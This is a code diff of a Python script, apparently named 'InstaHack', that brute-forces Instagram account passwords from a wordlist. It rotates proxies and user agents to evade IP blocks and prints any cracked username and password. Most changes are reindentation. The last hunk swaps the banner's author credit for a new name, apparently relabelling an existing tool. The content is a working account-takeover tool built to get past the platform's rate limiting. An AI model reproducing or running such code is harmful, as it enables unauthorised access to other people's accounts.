@@ -181,7 +181,7 @@ def brute(q):
             if e.getcode() == 400 or e.getcode() == 403:
                 if e.read().decode("utf8", 'ignore').find('"checkpoint_required"') != -1:
                     print(bcolors.OKGREEN + bcolors.BOLD + "\n[*]Successful Login "
-                          + bcolors.FAIL + "But need Checkpoint :|" + bcolors.OKGREEN)
+                            + bcolors.FAIL + "But need Checkpoint :|" + bcolors.OKGREEN)
                     print("---------------------------------------------------")
                     print("[!]Username: ", USER)
                     print("[!]Password: ", word)
@@ -194,15 +194,15 @@ def brute(q):
                     return
                 elif proxy:
                     print(bcolors.WARNING +
-                          "[!]Error: Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (proxy,)
-                          + bcolors.ENDC
-                          )
+                            "[!]Error: Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (proxy,)
+                            + bcolors.ENDC
+                            )
                     if proxy in proxys_working_list:
                         proxys_working_list.pop(proxy)
                     print(bcolors.OKGREEN + "[+] Online Proxy: ", str(len(proxys_working_list)) + bcolors.ENDC)
                 else:
                     print(bcolors.FAIL + "[!]Error : Your Ip is now on Instagram jail ,"
-                          " script will not work fine until you change your ip or use proxy" + bcolors.ENDC)
+                            " script will not work fine until you change your ip or use proxy" + bcolors.ENDC)
             else:
                 print("Error:", e.getcode())
 
@@ -319,13 +319,13 @@ if __name__ == "__main__":
     _debug = args.debug
 
     user_agents = ["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
-                   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko)",
-                   "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1",
-                   "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)",
-                   "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
-                   "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
-                   "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US)",
-                   "Mozilla/6.0 (Windows; S; MSTE 24.0 Windows NT 24.0; es-ES)"]
+                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko)",
+                    "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1",
+                    "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)",
+                    "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
+                    "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
+                    "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US)",
+                    "Mozilla/6.0 (Windows; S; MSTE 24.0 Windows NT 24.0; es-ES)"]
 
     try:
         words = open(args.word).readlines()
@@ -347,9 +347,8 @@ if __name__ == "__main__":
         logger = logging.getLogger(__name__)
 
     print(bcolors.HEADER + """.-------------------------------------------------------.""")
-    print(""" InSTa """)
-    print(""" by RetroAk """)
-    print(""" LinuxMallu """)
+    print(""" InstaHack """)
+    print(""" by JaimeTR """)
     print("""'-------------------------------------------------------'""")
 
     print(bcolors.OKGREEN + "[+] Username Loaded:", bcolors.BOLD + USER + bcolors.ENDC)
